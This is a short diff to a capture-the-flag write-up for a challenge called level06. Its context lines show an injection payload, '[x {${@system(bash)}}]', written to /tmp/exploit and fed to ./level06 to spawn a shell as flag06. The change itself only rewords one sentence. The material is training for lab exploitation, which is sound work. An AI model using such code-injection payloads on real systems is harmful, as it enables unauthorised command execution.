@@ -9,6 +9,6 @@ the system function. Let's use it to get a shell.
 -> echo '[x {${@system(bash)}}]' > /tmp/exploit
 -> ./level06 /tmp/exploit
 
-Aaaand, we have a shell as flag06.
+And here appears a shell as flag06.
 
 We can now get the next flag.
